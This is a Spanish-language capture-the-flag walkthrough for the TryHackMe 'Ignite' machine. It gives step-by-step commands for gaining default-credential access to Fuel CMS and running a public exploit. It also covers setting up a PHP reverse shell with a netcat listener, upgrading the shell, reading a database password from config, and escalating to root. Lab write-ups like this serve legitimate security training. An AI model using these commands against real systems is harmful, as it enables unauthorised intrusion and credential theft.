# Guía de Explotación - TryHackMe Ignite

## Reconocimiento

Iniciamos con un escaneo de Nmap para identificar los puertos abiertos, las versiones de los servicios en ejecución y otra información relevante:

```bash
nmap -T4 --min-rate=10000 -p- -A IP_MAQUINA_ATACADA
```

### Explicación de los parámetros:

- `-T4` -> Define la velocidad del escaneo.
- `--min-rate=10000` -> Envía al menos 10,000 paquetes por segundo.
- `-p-` -> Escanea todos los puertos disponibles.
- `-A` -> Activa un escaneo agresivo para obtener más información.

El escaneo muestra que el único puerto abierto es el **80/tcp**, donde corre un servidor web Apache con Fuel CMS. Además, `robots.txt` revela que la página de inicio de sesión del CMS se encuentra en `/fuel`.

## Explotación de la Web

Accedemos al sitio web a través del puerto 80 y probamos las credenciales predeterminadas `admin:admin` en la URL de acceso:

```bash
http://DIRECCION_DE_LA_WEB_ATACADA/fuel
```

El inicio de sesión es exitoso, lo que nos permite acceder al panel de control.

En la opción **"Click here for your site documentation"**, descubrimos que la versión instalada es **Fuel CMS 1.4**.

Investigamos vulnerabilidades para esta versión y encontramos un exploit para Fuel CMS 1.4.1, el cual descargamos y ejecutamos:

```bash
python3 50477.py -u http://DIRECCION_DE_LA_WEB_ATACADA
```

A continuación, descargamos una reverse shell en PHP desde PentestMonkey:

```bash
wget http://pentestmonkey.net/tools/php-reverse-shell/php-reverse-shell-1.0.tar.gz
```

Descomprimimos y editamos el archivo `.php`, reemplazando la IP y el puerto:

```php
$ip = "IP_MAQUINA_ATACANTE";
$port = "PUERTO_LIBRE";
```

Levantamos un servidor web en nuestra máquina atacante:

```bash
python3 -m http.server 80
```

Desde la máquina comprometida, descargamos la reverse shell y ponemos en escucha nuestro puerto con Netcat:

```bash
nc -nlvp PUERTO_CONFIGURADO
```

Ejecutamos la reverse shell accediendo desde el navegador:

```bash
http://DIRECCION_DE_LA_WEB_ATACADA/NOMBRE_ARCHIVO_REVERSE_SHELL
```

## Comprometiendo la Máquina

Si el ataque es exitoso, obtenemos acceso como `www-data`:

```bash
whoami
```

Para mejorar la interactividad de la shell:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
<CTRL> + Z
stty raw -echo; fg
```

Buscamos la primera flag dentro del directorio home del usuario comprometido:

```bash
cat flag.txt
```

## Escalada de Privilegios

Revisamos la configuración de Fuel CMS en:

```bash
fuel/application/config/database.php
```

Extraemos la contraseña con:

```bash
cat database.php | grep "pass"
```

Probamos la contraseña obtenida para elevar privilegios:

```bash
su -
```

Usamos la contraseña `mememe` y obtenemos acceso como `root`.

Finalmente, buscamos la flag final:

```bash
cat /root/root.txt
```

## Conclusión

¡Máquina comprometida con éxito! 🚀

